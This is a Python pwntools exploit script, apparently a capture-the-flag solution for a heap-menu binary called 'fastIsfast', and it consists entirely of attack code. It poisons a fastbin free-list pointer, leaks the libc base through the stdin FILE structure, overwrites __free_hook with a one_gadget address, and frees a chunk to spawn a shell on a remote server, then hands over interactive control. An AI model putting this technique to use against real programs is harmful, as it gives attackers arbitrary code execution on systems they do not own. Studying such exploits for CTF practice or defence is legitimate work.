from pwn import *
import os

DEBUG = False

context.log_level = 'debug'

def create():
    p.recvuntil('Your choice : ')
    p.sendline('1')

def edit(name, age, comment):
    p.recvuntil('Your choice : ')
    p.sendline('2')
    p.recvuntil('Name:\n')
    p.send(name)
    p.recvline()
    p.sendline(str(age))
    p.recvline()
    p.send(comment)
    
def erase():
    p.recvuntil('Your choice : ')
    p.sendline('3')

libc = ELF('./libc-2.23-64.so')
elf = ELF('./fastIsfast')

if DEBUG:
    env = os.environ
    env['LD_PRELOAD'] = './libc-2.23-64.so'
    p = process('./fastIsfast', env=env)
else:
    p = remote('202.112.51.217', 34123)
    
# 49

for i in range(46):
    create()

erase()
edit(p64(0x6020a0-8), 9, '1oner')
create()
create() #pwn 49

edit(p64(0x602090), 9, '1oner')

p.recvuntil('Your choice : ')
p.sendline('4')

p.recvuntil('Name : ')
stdin_addr = u64(p.recvuntil('\nAge : ', drop=True).ljust(8, '\x00'))
something = int(p.recvuntil('\nComment :', drop=True))

libc_base = stdin_addr - libc.symbols['_IO_2_1_stdin_']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh'))
one_gadget = libc_base + 0x4526a
free_hook = libc_base + libc.symbols['__free_hook']

edit(p64(stdin_addr), 0, p64(something) + p64(0) + p64(free_hook))
edit(p64(one_gadget), 0, '\x00')
erase()

p.interactive()



